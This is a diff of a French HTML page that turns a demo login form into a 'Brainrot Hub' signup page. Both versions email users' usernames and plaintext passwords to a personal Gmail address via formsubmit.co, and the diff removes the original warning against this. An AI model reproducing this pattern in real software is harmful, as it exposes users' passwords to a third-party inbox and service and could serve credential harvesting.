@@ -1,79 +1,146 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Formulaire : pseudo & mdp</title>
-  <style>
-    :root{--bg:#f7f9fc;--card:#fff;--accent:#3b82f6;--muted:#6b7280}
-    body{font-family:Inter,system-ui,Segoe UI,Roboto,"Helvetica Neue",Arial;margin:0;background:var(--bg);display:flex;align-items:center;justify-content:center;height:100vh}
-    .card{background:var(--card);padding:28px;border-radius:12px;box-shadow:0 6px 24px rgba(15,23,42,0.08);width:340px}
-    h1{margin:0 0 12px;font-size:18px;color:#0f172a}
-    p.muted{margin:0 0 18px;color:var(--muted);font-size:13px}
-    label{display:block;margin-bottom:8px;font-weight:600;font-size:13px;color:#0f172a}
-    input[type="text"], input[type="password"]{
-      width:100%;padding:10px 12px;border:1px solid #e6e9ee;border-radius:8px;margin-bottom:12px;font-size:14px;box-sizing:border-box
-    }
-    .row{display:flex;align-items:center;gap:8px}
-    .btn{
-      background:var(--accent);color:#fff;padding:10px 14px;border-radius:8px;border:0;cursor:pointer;font-weight:600;margin-top:6px;width:100%;
-      box-shadow:0 6px 18px rgba(59,130,246,0.12)
-    }
-    .small{font-size:12px;color:var(--muted);margin-top:10px}
-    .toggle{background:transparent;border:0;color:var(--accent);cursor:pointer;padding:0;font-weight:600}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brainrot Hub - Inscription</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .auth-box {
+            width: 100%;
+            max-width: 450px;
+            padding: 50px;
+            border: 2px solid #e0e0e0;
+            border-radius: 15px;
+        }
+
+        .auth-box h1 {
+            font-size: 42px;
+            text-align: center;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .auth-box p {
+            text-align: center;
+            color: #666;
+            margin-bottom: 30px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .error {
+            background: #fee;
+            color: #c33;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+        }
+    </style>
 </head>
 <body>
-  <form class="card" action="https://formsubmit.co/megumikun84@gmail.com" method="POST" autocomplete="on">
-    <h1>Connexion</h1>
-    <p class="muted">Entrez ton pseudo et ton mot de passe. (Exemple d’envoi via FormSubmit)</p>
-
-    <!-- Champ pseudo -->
-    <label for="pseudo">Pseudo</label>
-    <input id="pseudo" name="pseudo" type="text" placeholder="Ton pseudo" required minlength="2" autocomplete="username">
-
-    <!-- Champ mot de passe -->
-    <label for="mdp">Mot de passe</label>
-    <div class="row">
-      <input id="mdp" name="mdp" type="password" placeholder="••••••••" required minlength="6" autocomplete="current-password">
-      <button type="button" class="toggle" id="togglePwd" title="Afficher / masquer">Afficher</button>
+    <div class="auth-box">
+        <h1>🧠 Brainrot Hub</h1>
+        <p>Partage tes meilleurs brainrots</p>
+        
+        <div class="error" id="errorMsg"></div>
+        
+        <form action="https://formsubmit.co/megumikun84@gmail.com" method="POST">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_subject" value="Nouvelle inscription Brainrot Hub">
+            
+            <div class="input-group">
+                <label>Pseudo</label>
+                <input type="text" name="pseudo" id="username" placeholder="Minimum 3 caractères" required>
+            </div>
+            
+            <div class="input-group">
+                <label>Mot de passe</label>
+                <input type="password" name="password" id="password" placeholder="Minimum 5 caractères" required>
+            </div>
+            
+            <button type="submit" class="btn" onclick="return validateForm()">S'inscrire</button>
+        </form>
     </div>
 
-    <!-- Champs cachés pour FormSubmit -->
-    <!-- _captcha : désactive le captcha (optionnel) -->
-    <input type="hidden" name="_captcha" value="false">
-    <!-- _subject : sujet de l'email -->
-    <input type="hidden" name="_subject" value="Nouveau formulaire : connexion">
-    <!-- _next : page de redirection après envoi (modifie si tu veux) -->
-    <input type="hidden" name="_next" value="https://example.com/merci.html">
-    <!-- _honeypot : champ anti-bot -->
-    <input type="text" name="_honey" style="display:none">
+    <script>
+        function validateForm() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            const errorMsg = document.getElementById('errorMsg');
 
-    <button class="btn" type="submit">Envoyer</button>
+            errorMsg.style.display = 'none';
 
-    <p class="small">
-      Remarque : la première soumission demandera probablement la confirmation de l'adresse e-mail côté FormSubmit (ils envoient un lien de validation).
-    </p>
-    <p class="small" style="margin-top:4px;color:#b91c1c;font-weight:600;">
-      ⚠️ Sécurité : éviter d’utiliser ce formulaire pour stocker des mots de passe d'utilisateurs en production.
-    </p>
-  </form>
+            if (username.length < 3) {
+                errorMsg.textContent = 'Le pseudo doit contenir au moins 3 caractères';
+                errorMsg.style.display = 'block';
+                return false;
+            }
 
-  <script>
-    // Simple toggle afficher/masquer mot de passe
-    (function(){
-      const pwd = document.getElementById('mdp');
-      const btn = document.getElementById('togglePwd');
-      btn.addEventListener('click', () => {
-        if (pwd.type === 'password') {
-          pwd.type = 'text';
-          btn.textContent = 'Masquer';
-        } else {
-          pwd.type = 'password';
-          btn.textContent = 'Afficher';
+            if (password.length < 5) {
+                errorMsg.textContent = 'Le mot de passe doit contenir au moins 5 caractères';
+                errorMsg.style.display = 'block';
+                return false;
+            }
+
+            return true;
         }
-      });
-    })();
-  </script>
+    </script>
 </body>
 </html>
